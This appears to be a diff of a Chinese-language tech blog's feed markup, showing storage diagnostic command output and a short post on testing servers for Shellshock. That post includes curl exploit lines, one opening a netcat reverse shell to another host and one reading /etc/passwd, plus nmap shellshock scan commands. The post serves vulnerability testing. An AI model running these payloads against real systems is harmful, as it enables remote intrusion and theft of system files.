+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"lspci | grep RAID\n00:1f.2 RAID bus controller: Intel Corporation 82801 Mobile SATA Controller [RAID mode] (rev 04)\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;h5 id="lshw"&gt;lshw&lt;/h5&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-62eac0f57da15fed78a76db9083c21aa-1"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;lshw -class storage
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; *-raid
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; description: RAID bus controller
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; product: &lt;span class="m"&gt;82801&lt;/span&gt; Mobile SATA Controller &lt;span class="o"&gt;[&lt;/span&gt;RAID mode&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; vendor: Intel Corporation
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; physical id: 1f.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; bus info: pci@0000:00:1f.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; logical name: scsi0
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; version: &lt;span class="m"&gt;04&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; width: &lt;span class="m"&gt;32&lt;/span&gt; bits
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; clock: 66MHz
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; capabilities: raid msi pm bus_master cap_list emulated
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; configuration: &lt;span class="nv"&gt;driver&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;ahci &lt;span class="nv"&gt;latency&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; resources: irq:26 ioport:f0d0&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;8&lt;span class="o"&gt;)&lt;/span&gt; ioport:f0c0&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;4&lt;span class="o"&gt;)&lt;/span&gt; ioport:f0b0&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;8&lt;span class="o"&gt;)&lt;/span&gt; ioport:f0a0&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;4&lt;span class="o"&gt;)&lt;/span&gt; ioport:f060&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;32&lt;span class="o"&gt;)&lt;/span&gt; memory:f7e36000-f7e367ff
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"lshw -class storage\n *-raid\n description: RAID bus controller\n product: 82801 Mobile SATA Controller [RAID mode]\n vendor: Intel Corporation\n physical id: 1f.2\n bus info: pci@0000:00:1f.2\n logical name: scsi0\n version: 04\n width: 32 bits\n clock: 66MHz\n capabilities: raid msi pm bus_master cap_list emulated\n configuration: driver=ahci latency=0\n resources: irq:26 ioport:f0d0(size=8) ioport:f0c0(size=4) ioport:f0b0(size=8) ioport:f0a0(size=4) ioport:f060(size=32) memory:f7e36000-f7e367ff\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;h5 id="smartctl"&gt;smartctl&lt;/h5&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-62eac0f57da15fed78a76db9083c21aa-2"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;dmesg &lt;span class="p"&gt;|&lt;/span&gt; grep -i scsi
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt; 0.210852&lt;span class="o"&gt;]&lt;/span&gt; SCSI subsystem initialized
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt; 0.341280&lt;span class="o"&gt;]&lt;/span&gt; Block layer SCSI generic &lt;span class="o"&gt;(&lt;/span&gt;bsg&lt;span class="o"&gt;)&lt;/span&gt; driver version 0.4 loaded &lt;span class="o"&gt;(&lt;/span&gt;major 243&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt; 1.213299&lt;span class="o"&gt;]&lt;/span&gt; scsi 0:0:0:0: Direct-Access ATA ST320LT012-9WS14 YAM1 PQ: &lt;span class="m"&gt;0&lt;/span&gt; ANSI: &lt;span class="m"&gt;5&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt; 1.319886&lt;span class="o"&gt;]&lt;/span&gt; sd 0:0:0:0: &lt;span class="o"&gt;[&lt;/span&gt;sda&lt;span class="o"&gt;]&lt;/span&gt; Attached SCSI disk
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt; 19.571008&lt;span class="o"&gt;]&lt;/span&gt; sd 0:0:0:0: Attached scsi generic sg0 &lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"dmesg | grep -i scsi\n[ 0.210852] SCSI subsystem initialized\n[ 0.341280] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 243)\n...\n[ 1.213299] scsi 0:0:0:0: Direct-Access ATA ST320LT012-9WS14 YAM1 PQ: 0 ANSI: 5\n[ 1.319886] sd 0:0:0:0: [sda] Attached SCSI disk\n[ 19.571008] sd 0:0:0:0: Attached scsi generic sg0 type 0\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-62eac0f57da15fed78a76db9083c21aa-3"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;smartctl --all /dev/sda
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Model Family: Seagate Laptop HDD
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Device Model: ST320LT012-9WS14C
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Serial Number: S0V3R9LL
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;LU WWN Device Id: &lt;span class="m"&gt;5&lt;/span&gt; 000c50 05be4653c
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Firmware Version: 0001YAM1
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;User Capacity: 320,072,933,376 bytes &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;320&lt;/span&gt; GB&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Sector Sizes: &lt;span class="m"&gt;512&lt;/span&gt; bytes logical, &lt;span class="m"&gt;4096&lt;/span&gt; bytes physical
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Rotation Rate: &lt;span class="m"&gt;5400&lt;/span&gt; rpm
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Form Factor: 2.5 inches
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Device is: In smartctl database 7.3/5319
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ATA Version is: ATA8-ACS T13/1699-D revision &lt;span class="m"&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;SATA Version is: SATA 2.6, 3.0 Gb/s &lt;span class="o"&gt;(&lt;/span&gt;current: 3.0 Gb/s&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Local Time is: Sat Nov &lt;span class="m"&gt;19&lt;/span&gt; 20:52:01 &lt;span class="m"&gt;2022&lt;/span&gt; PKT
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;SMART support is: Available - device has SMART capability.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;SMART support is: Enabled
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"smartctl --all /dev/sda\nModel Family: Seagate Laptop HDD\nDevice Model: ST320LT012-9WS14C\nSerial Number: S0V3R9LL\nLU WWN Device Id: 5 000c50 05be4653c\nFirmware Version: 0001YAM1\nUser Capacity: 320,072,933,376 bytes [320 GB]\nSector Sizes: 512 bytes logical, 4096 bytes physical\nRotation Rate: 5400 rpm\nForm Factor: 2.5 inches\nDevice is: In smartctl database 7.3/5319\nATA Version is: ATA8-ACS T13/1699-D revision 4\nSATA Version is: SATA 2.6, 3.0 Gb/s (current: 3.0 Gb/s)\nLocal Time is: Sat Nov 19 20:52:01 2022 PKT\nSMART support is: Available - device has SMART capability.\nSMART support is: Enabled\n...\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;h5 id="megacli"&gt;MegaCLI&lt;/h5&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-62eac0f57da15fed78a76db9083c21aa-4"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;megacli -LDInfo -Lall -aALL
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Adapter &lt;span class="m"&gt;0&lt;/span&gt; -- Virtual Drive Information:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Virtual Drive: &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Target Id: 0&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Name : SEAGATE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;RAID Level : Primary-1, Secondary-0, RAID Level Qualifier-0
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Size : &lt;span class="m"&gt;320&lt;/span&gt; GB
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Sector Size : &lt;span class="m"&gt;512&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Mirror Data : &lt;span class="m"&gt;320&lt;/span&gt; GB
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;State : Optimal
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"megacli -LDInfo -Lall -aALL\nAdapter 0 -- Virtual Drive Information:\nVirtual Drive: 0 (Target Id: 0)\nName : SEAGATE\nRAID Level : Primary-1, Secondary-0, RAID Level Qualifier-0\nSize : 320 GB\nSector Size : 512\nMirror Data : 320 GB\nState : Optimal\n...\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;h5 id="lsscsi"&gt;lsscsi&lt;/h5&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-62eac0f57da15fed78a76db9083c21aa-5"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;lsscsi
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;0:0:0:0&lt;span class="o"&gt;]&lt;/span&gt; disk ATA ST320LT012-9WS14 YAM1 /dev/sda
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"lsscsi\n[0:0:0:0] disk ATA ST320LT012-9WS14 YAM1 /dev/sda\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;h5 id="廠商專用工具"&gt;廠商專用工具&lt;/h5&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-62eac0f57da15fed78a76db9083c21aa-6"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;omreport storage vdisk
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;List of Virtual Disks in the System
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Controller SEAGATE Laptop HDD
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ID : &lt;span class="m"&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Status : Ok
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Name : SEAGATE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;State : Ready
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Hot Spare Policy violated : Not Assigned
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Encrypted : No
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Layout : RAID-0
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Size : 320.00 GB &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;343597383680&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;T10 Protection Information Status : No
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Associated Fluid Cache State : Not Applicable
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Device Name : /dev/sda
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Bus Protocol : ATA
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Media : HDD
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Read Policy : Adaptive Read Ahead
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Write Policy : Write Back
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Cache Policy : Not Applicable
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Stripe Element Size : &lt;span class="m"&gt;128&lt;/span&gt; KB
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Disk Cache Policy : Enabled
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"omreport storage vdisk\nList of Virtual Disks in the System\n\nController SEAGATE Laptop HDD\nID : 0\nStatus : Ok\nName : SEAGATE\nState : Ready\nHot Spare Policy violated : Not Assigned\nEncrypted : No\nLayout : RAID-0\nSize : 320.00 GB (343597383680 bytes)\nT10 Protection Information Status : No\nAssociated Fluid Cache State : Not Applicable\nDevice Name : /dev/sda\nBus Protocol : ATA\nMedia : HDD\nRead Policy : Adaptive Read Ahead\nWrite Policy : Write Back\nCache Policy : Not Applicable\nStripe Element Size : 128 KB\nDisk Cache Policy : Enabled\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;</description></item><item><title>測試伺服器是否易受 Shellshock 漏洞影響</title><link>https://linzeyan.github.io/zh-tw/posts/2022/20221128-linux-shellshock-bug/</link><pubDate>Mon, 28 Nov 2022 15:35:30 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/2022/20221128-linux-shellshock-bug/</guid><description>&lt;ul&gt;
 &lt;li&gt;&lt;a href="https://www.baeldung.com/linux/shellshock-bug" target="_blank" rel="noopener"&gt;測試伺服器是否易受 Shellshock 漏洞影響&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h5 id="shellshock-漏洞"&gt;Shellshock 漏洞&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;env &lt;span style="color:#e06c75"&gt;x&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#39; () {:;};&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="利用-shellshock-漏洞"&gt;利用 Shellshock 漏洞&lt;/h5&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-9e308554f20b961f35f5a63046cfecb4-0"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;env &lt;span class="nv"&gt;x&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; () {:;};&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"env x=' () {:;};'\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;h5 id="利用-shellshock-漏洞"&gt;利用 Shellshock 漏洞&lt;/h5&gt;
 &lt;ul&gt;
 &lt;li&gt;當功能忽略使用者指定的指令，改執行 ForceCommand 的內容時，置換指令就會被執行。&lt;/li&gt;
 &lt;li&gt;使用者的原始指令會被放在 &amp;ldquo;SSH_ORIGINAL_COMMAND&amp;rdquo; 環境變數中。若使用者預設 shell 是 Bash，Bash 在啟動時會解析 &amp;ldquo;SSH_ORIGINAL_COMMAND&amp;rdquo; 的值並執行其中的指令。&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h5 id="shellshock-利用指令範例"&gt;Shellshock 利用指令範例&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;## 1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl -H &lt;span style="color:#98c379"&gt;&amp;#34;X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.y.y 443&amp;#34;&lt;/span&gt; 192.168.x.y/CGI-bin/hello.cgi
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;## 2&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl --insecure 192.168.x.x -H &lt;span style="color:#98c379"&gt;&amp;#34;User-Agent: () { :; }; /bin/cat /etc/passwd&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-9e308554f20b961f35f5a63046cfecb4-1"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;## 1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;curl -H &lt;span class="s2"&gt;&amp;#34;X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.y.y 443&amp;#34;&lt;/span&gt; 192.168.x.y/CGI-bin/hello.cgi
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;## 2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;curl --insecure 192.168.x.x -H &lt;span class="s2"&gt;&amp;#34;User-Agent: () { :; }; /bin/cat /etc/passwd&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"## 1\ncurl -H \"X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.y.y 443\" 192.168.x.y/CGI-bin/hello.cgi\n\n## 2\ncurl --insecure 192.168.x.x -H \"User-Agent: () { :; }; /bin/cat /etc/passwd\"\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;ul&gt;
 &lt;li&gt;使用 nmap 腳本測試漏洞&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nmap -sV -p- --script http-shellshock 192.168.x.x
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nmap -sV -p- --script http-shellshock --script-args &lt;span style="color:#e06c75"&gt;uri&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;/cgi-bin/bin,cmd&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;ls 192.168.x.x
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>如何刪除檔名含有不可列印字元的檔案</title><link>https://linzeyan.github.io/zh-tw/posts/2022/20221114-delete-files-non-printable-characters/</link><pubDate>Mon, 14 Nov 2022 13:55:17 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/2022/20221114-delete-files-non-printable-characters/</guid><description>&lt;ul&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-9e308554f20b961f35f5a63046cfecb4-2"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -sV -p- --script http-shellshock 192.168.x.x
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -sV -p- --script http-shellshock --script-args &lt;span class="nv"&gt;uri&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/cgi-bin/bin,cmd&lt;span class="o"&gt;=&lt;/span&gt;ls 192.168.x.x
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"nmap -sV -p- --script http-shellshock 192.168.x.x\nnmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls 192.168.x.x\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;</description></item><item><title>如何刪除檔名含有不可列印字元的檔案</title><link>https://linzeyan.github.io/zh-tw/posts/2022/20221114-delete-files-non-printable-characters/</link><pubDate>Mon, 14 Nov 2022 13:55:17 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/2022/20221114-delete-files-non-printable-characters/</guid><description>&lt;ul&gt;
 &lt;li&gt;&lt;a href="https://www.baeldung.com/linux/delete-files-non-printable-characters" target="_blank" rel="noopener"&gt;如何刪除檔名含有不可列印字元的檔案&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ls -l
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;total &lt;span style="color:#d19a66"&gt;13&lt;/span&gt;
